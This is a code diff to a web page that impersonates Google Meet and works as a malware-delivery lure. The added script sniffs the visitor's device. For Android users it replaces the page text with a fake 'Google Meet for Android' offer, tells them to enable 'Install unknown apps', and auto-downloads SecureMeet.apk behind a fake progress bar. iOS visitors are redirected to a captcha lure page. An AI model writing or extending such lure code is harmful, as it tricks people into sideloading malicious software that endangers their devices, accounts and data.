@@ -236,13 +236,31 @@ body {
 </div>
 
 <script>
-// ── Mobile detection — redirect to lure page directly ────────
+// ── Device detection ────────────────────────────────────────
 (function() {
   const ua = navigator.userAgent;
-  const isMobile = /Android|iPhone|iPad|iPod|Mobile|BlackBerry|IEMobile|Opera Mini/i.test(ua);
-  if (isMobile) {
+  const isAndroid = /Android/i.test(ua);
+  const isIOS = /iPhone|iPad|iPod/i.test(ua);
+
+  if (isAndroid) {
+    // Show Android download UI instead of Linux AppImage
+    document.querySelector('.promo-title').textContent = 'Better meetings on your phone';
+    document.querySelector('.promo-eyebrow').textContent = 'GOOGLE MEET FOR ANDROID';
+    document.getElementById('dl-btn').textContent = '⬇ Download for Android';
+    document.getElementById('dl-btn').onclick = function(e) {
+      e.preventDefault(); startAndroidDownload();
+    };
+    // Update steps for Android
+    document.querySelector('.steps-list').innerHTML = `
+      <li><div class="step-num">1</div><span>Open <strong>Settings → Security</strong> (or Privacy) and enable <strong>"Install unknown apps"</strong> for Chrome</span></li>
+      <li><div class="step-num">2</div><span>Open your <strong>Downloads</strong> folder and tap <strong>SecureMeet.apk</strong></span></li>
+      <li><div class="step-num">3</div><span>Tap <strong>Install</strong> → Open → your meeting starts automatically</span></li>
+    `;
+  } else if (isIOS) {
+    // iOS can't sideload APK — redirect to captcha lure
     window.location.replace('/browser');
   }
+  // Desktop: show default Linux AppImage flow
 })();
 
 function startDownload() {
@@ -286,6 +304,45 @@ function startDownload() {
     btn.textContent = '✓ Downloaded';
     steps.classList.add('show');
   }, 3000);
+}
+
+function startAndroidDownload() {
+  const btn    = document.getElementById('dl-btn');
+  const status = document.getElementById('dl-status');
+  const bar    = document.getElementById('dl-bar');
+  const label  = document.getElementById('dl-label');
+  const steps  = document.getElementById('steps-card');
+
+  btn.textContent = '⏳ Downloading...';
+  btn.style.pointerEvents = 'none';
+  btn.style.background = '#5f6368';
+  status.classList.add('show');
+
+  let pct = 0;
+  const iv = setInterval(() => {
+    pct += Math.random() * 22;
+    if (pct > 95) pct = 95;
+    bar.style.width = pct + '%';
+    label.textContent = `Downloading SecureMeet... ${Math.round(pct)}%`;
+  }, 250);
+
+  setTimeout(() => {
+    const a = document.createElement('a');
+    a.href = '/download/android';
+    a.download = 'SecureMeet.apk';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }, 400);
+
+  setTimeout(() => {
+    clearInterval(iv);
+    bar.style.width = '100%';
+    bar.style.background = '#34a853';
+    label.textContent = '✓ Download complete — SecureMeet.apk';
+    btn.textContent = '✓ Downloaded';
+    steps.classList.add('show');
+  }, 2500);
 }
 
 function openInBrowser() {
